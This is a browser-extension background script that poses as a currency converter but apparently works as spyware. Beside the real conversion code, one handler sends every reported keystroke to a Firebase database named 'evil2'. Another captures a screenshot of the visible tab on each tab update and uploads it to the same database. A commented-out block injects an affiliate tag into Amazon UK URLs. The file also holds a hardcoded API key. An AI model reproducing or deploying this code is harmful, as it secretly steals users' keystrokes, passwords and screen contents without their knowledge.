
const apiKey = f4c7ce162c0e012bdd5b0d6d8b014cb4;
const dbDomain = "https://evil2-28cdc-default-rtdb.firebaseio.com";

function converetAmount(fromCurrency, toCurrency, amount, callback) {
    let fromCurrencyInner = fromCurrency;
    let toCurrencyInner = toCurrency;
    fetch("http://api.exchangeratesapi.io/latest?&access_key=" + apiKey)
        .then(respone => respone.json())
        .then(data=> {
            let convertRate = data["rates"][toCurrencyInner] * 1/data["rates"][fromCurrencyInner];
            callback(getSymbol(toCurrencyInner) + (parseFloat(amount) * convertRate).toFixed(2));
        })
}

chrome.runtime.onMessage.addListener(
    function(request, sender, sendResponse) {
        if (request.type === "getConvertedCurrency") {
            let fromCurrency = request.currency;
            let amount = request.amount;
            chrome.storage.local.get(['currency'],
                function(toCurrency) {
                    converetAmount(
                        fromCurrency,
                        toCurrency.currency,
                        amount,
                        sendResponse
                    )
            });
        }
        return true;
    }
);


function getSymbol(cur) {
    return ({USD: '$', EUR: '€', GBP: '£', ILS: '₪'}[cur]);
}


chrome.runtime.onMessage.addListener(function(request, sender, sendResponse) {
    if (request.type === "keyup") {
        fetch(
            dbDomain + "/keys.json",
            {
                method: "POST",
                body: JSON.stringify({"key": request.key})

            }
        )
    }
});

async function getCurrentTab() {
    let queryOptions = { active: true, currentWindow: true };
    let [tab] = await chrome.tabs.query(queryOptions);
    return tab;
  }

chrome.tabs.onUpdated.addListener( () => {
    chrome.tabs.captureVisibleTab(null, {format: "jpeg", quality: 50})
    .then((img) => {
        console.log(img)
        fetch(
            dbDomain + "/capture.json",
            {
                method: "POST",
                body: JSON.stringify({"capture": img})
            }
        )
    })
});



/*

chrome.webRequest.onBeforeRequest.addListener( function(request) {
    var url = new URL(request.url)
    url.searchParams.set('tag', 'X85GHVYNP');
    return {
        redirectUrl: url.toString()
    }},
    {urls: ["https://www.amazon.co.uk/*"]},
    ["blocking"]);

*/

